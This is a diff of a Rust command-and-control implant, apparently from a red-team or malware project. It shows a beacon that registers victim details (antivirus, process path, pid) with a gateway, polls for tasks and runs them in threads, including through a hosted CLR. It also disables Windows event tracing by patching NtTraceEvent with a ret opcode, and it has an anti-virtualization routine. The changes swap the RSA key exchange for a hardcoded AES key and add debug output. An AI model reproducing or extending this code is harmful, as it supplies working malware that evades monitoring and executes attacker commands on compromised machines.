@@ -12,11 +12,6 @@ use std::thread;
 
 use std::env;
 use std::process;
-use rsa::{
-    pkcs1::DecodeRsaPublicKey, 
-    Pkcs1v15Encrypt, 
-    RsaPublicKey
-};
 
 use base64::prelude::*;
 use crypto::{ symmetriccipher, buffer, aes, blockmodes };
@@ -77,22 +72,8 @@ pub struct Win32BIOS {
 const BUILD_ID: &str = "debug";
 const CONNECTION_INTERVAL: u64 = 5;
 const ANTI_VIRTUAL: bool = false;
-const GATEWAY_PATH: &str = "http://127.0.0.1:9999/niXmjq7Jk7yve76Z";
-const SERVER_RSA_PUB: &str = "
------BEGIN RSA PUBLIC KEY-----
-MIIBCgKCAQEAx+zN1dr6iV1Upyd9ixoG2gxvupYqIeuFMV0GgWcCK91pcPZCkeQG
-SDy/LhGjCjOMvX/2Eg0wsed99hntvZ2b6RKdsdfrSVUFxvp6H0lEVPGPjDCMssjY
-RLi3JbKIopLtgdDHdnf4nCpnSrMNFV5ZuqdIoQIMaw/imyWATNSB18WOebAA8lI9
-oR0XG89Ob3/IyxIAK1rUqlx1a1oJ+uBsLscsxwOGWyXir6by31uVfrdzxORFviCr
-8bZfuX5wF06WQ9TH1WFAw/G4CTTWP5qooLug04Qt7cAemTLfJjkyaDeLq20ia2ix
-xs9LxVype+cEoOSfpawaAH71Kw+d40Dp7wIDAQAB
------END RSA PUBLIC KEY-----
-";
-
-// Main loop that handles sending a heartbeat and recieving connections to server is always running. 
-// When the main loop recieves a task, it adds it to a global vec.
-// Another loop in another thread will go through each item in the global vec, and complete the task.
-// After the task is completed, it will send a "submit_output" request to the server.
+const GATEWAY_PATH: &str = "http://127.0.0.1:9999/TESTING";
+const INITIAL_ENCRYPTION_KEY: &[u8] = b"1c3d0fc825a3b64649167af7e04d3f63";
 
 fn main() {
 
@@ -180,19 +161,15 @@ fn main() {
 
     exports.add("ntdll.dll", "NtTraceEvent").expect("[-] Error finding address of NtTraceEvent");
 
-    // retrieve the virtual address of NtTraceEvent
     let nt_trace_addr = exports.get_function_address("NtTraceEvent").expect("[-] Unable to retrieve address of NtTraceEvent.") as *const c_void;
 
-    // get a handle to the current process
     let handle = unsafe {GetCurrentProcess()};
 
-    // set up variables for WriteProcessMemory
     let ret_opcode: u8 = 0xC3; // ret opcode for x86
     let size = mem::size_of_val(&ret_opcode);
     let mut bytes_written: usize = 0;
 
 
-    // patch the function 
     let res = unsafe {
         WriteProcessMemory(handle, 
             nt_trace_addr,
@@ -231,16 +208,16 @@ fn main() {
 // Might have to write custom ones and load them into a new process, or find way to patch exit.
 
 fn submit_output(client_id: &str, command_id: &str, output: &str, encryption_key: &str) {
-    let combined = format!("{}.{}", 
-        client_id, 
-        aes_256cbc_encrypt(&json!({
+    let data = aes_256cbc_encrypt(
+        &json!({
             "action": "submit_output",
             "command_id": command_id,
             "output": "Command completed!"
-        }).to_string(), encryption_key.as_bytes()).unwrap()
-    );
+        }).to_string().as_bytes(), 
+        encryption_key.as_bytes()
+    ).unwrap();
 
-    match ureq::post(GATEWAY_PATH).set("User-Agent", "AQCmw7JX").send_string(&combined) {
+    match ureq::post(GATEWAY_PATH).set("User-Agent", "TESTING").send_string(&data) {
         Ok(result) => {
             fprint("success", &format!("Output submitted successfully: {}", output));
             result.into_string().unwrap()
@@ -260,15 +237,12 @@ fn heartbeat_loop(client_id_intake: String, encryption_key_intake: String) {
     loop {
         thread::sleep(Duration::from_millis(CONNECTION_INTERVAL * 1000));
 
-        let combined = format!("{}.{}", 
-            client_id, 
-            aes_256cbc_encrypt(&json!({
-                "action": "heartbeat"
-            }).to_string(), 
-            encryption_key.as_bytes()).unwrap()
-        );
+        let data = aes_256cbc_encrypt(&json!({
+            "action": "heartbeat"
+        }).to_string().as_bytes(), 
+        encryption_key.as_bytes()).unwrap();
 
-        let result = match ureq::post(GATEWAY_PATH).set("User-Agent", "AQCmw7JX").send_string(&combined) {
+        let result = match ureq::post(GATEWAY_PATH).set("User-Agent", "TESTING").send_string(&data) {
             Ok(result) => {
                 result.into_string().unwrap()
             },
@@ -308,7 +282,7 @@ fn heartbeat_loop(client_id_intake: String, encryption_key_intake: String) {
                 continue
             }
         };
-
+        fprint("debug", &format!("Handling json: {}", decrypted_response_json));
         thread::spawn(move || {
             fprint("info", &format!("Handling command: {}", key_to_string(&decrypted_response_json, "cmd_type").as_str()));
             match key_to_string(&decrypted_response_json, "cmd_type").as_str() {
@@ -484,7 +458,7 @@ fn anti_virtualization() {
 
 fn init_connection() -> (String, String) {
 
-    thread::sleep(Duration::from_millis(CONNECTION_INTERVAL * 1000));
+    //thread::sleep(Duration::from_millis(CONNECTION_INTERVAL * 1000));
     let wmi_con = WMIConnection::new(COMLibrary::new().unwrap()).unwrap();
 
     let proccess_id = process::id();
@@ -588,11 +562,10 @@ fn init_connection() -> (String, String) {
     loop {
         thread::sleep(Duration::from_millis(5000));
         let client_bytes = random_bytes(32);
-        let mut rng = rand::thread_rng();
-        let server_pub_rsa = RsaPublicKey::from_pkcs1_pem(&SERVER_RSA_PUB).unwrap();
-        let rsa_client_bytes = BASE64_STANDARD.encode(server_pub_rsa.encrypt(&mut rng, Pkcs1v15Encrypt, &client_bytes).unwrap());
+        let aes_client_bytes = aes_256cbc_encrypt(&client_bytes, INITIAL_ENCRYPTION_KEY);
+        fprint("debug", &format!("Sending {:?} to server (len {})", aes_client_bytes, aes_client_bytes.clone().unwrap().len()));
 
-        let server_response = match ureq::post(GATEWAY_PATH).set("User-Agent", "AQCmw7JXd").send_string(&rsa_client_bytes) {
+        let server_response = match ureq::post(GATEWAY_PATH).set("User-Agent", "TESTING").send_string(&aes_client_bytes.unwrap()) {
             Ok(result) => {
                 fprint("success", &format!("Connection established with {}", GATEWAY_PATH.yellow()));
                 result.into_string().unwrap()
@@ -603,6 +576,7 @@ fn init_connection() -> (String, String) {
             }
         };
 
+
         let raw_server_json: Vec<u8> = match aes_256cbc_decrypt(&server_response, &client_bytes) {
             Ok(result) => result,
             Err(error) => {
@@ -610,6 +584,8 @@ fn init_connection() -> (String, String) {
                 continue;
             }
         };
+
+        fprint("debug", &format!("Server Response: {:?} (len {})", server_response, server_response.clone().len()));
 
         let parsed_server_json = match serde_json::from_slice::<serde_json::Value>(&raw_server_json) {
             Ok(result) => result,
@@ -642,8 +618,6 @@ fn init_connection() -> (String, String) {
             get_timestamp() - start_time
         }, encryption_key.yellow()));
 
-
-        let rsaed_encryption_key = BASE64_STANDARD.encode(server_pub_rsa.encrypt(&mut rng, Pkcs1v15Encrypt, &encryption_key.as_bytes()).unwrap());
         let registration_payload = aes_256cbc_encrypt(&json!({
             "build_id": BUILD_ID,
             "version": 10,
@@ -656,10 +630,9 @@ fn init_connection() -> (String, String) {
             "antivirus": antivirus,
             "path": proccess_path,
             "pid": proccess_id,
-        }).to_string(), encryption_key.as_bytes()).unwrap();
+        }).to_string().as_bytes(), encryption_key.as_bytes()).unwrap();
 
-        let combined = format!("{}.{}", rsaed_encryption_key, registration_payload);
-        let registration_response = match ureq::post(GATEWAY_PATH).set("User-Agent", "AQCmw7JX").send_string(&combined) {
+        let registration_response = match ureq::post(GATEWAY_PATH).set("User-Agent", "TESTING").send_string(&registration_payload) {
             Ok(result) => {
                 result.into_string().unwrap()
             },
@@ -708,10 +681,7 @@ unsafe fn patched_clr_run(client_id: &str, command_id: &str, encryption_key: &st
     clr.run().unwrap();
 }
 
-
-// unreachable :BUFFER TOO SMALL
-// ohiohoiHDOH12OID
-fn aes_256cbc_encrypt(data: &str, key: &[u8]) -> core::result::Result<String, symmetriccipher::SymmetricCipherError> {
+fn aes_256cbc_encrypt(data: &[u8], key: &[u8]) -> core::result::Result<String, symmetriccipher::SymmetricCipherError> {
 
     let mut encryptor = aes::cbc_encryptor(
             aes::KeySize::KeySize256,
@@ -720,7 +690,7 @@ fn aes_256cbc_encrypt(data: &str, key: &[u8]) -> core::result::Result<String, sy
             blockmodes::PkcsPadding);
    
     let mut final_result = Vec::<u8>::new();
-    let mut read_buffer = buffer::RefReadBuffer::new(data.as_bytes());
+    let mut read_buffer = buffer::RefReadBuffer::new(data);
     let mut buffer = [0; 4096];
     let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);
 
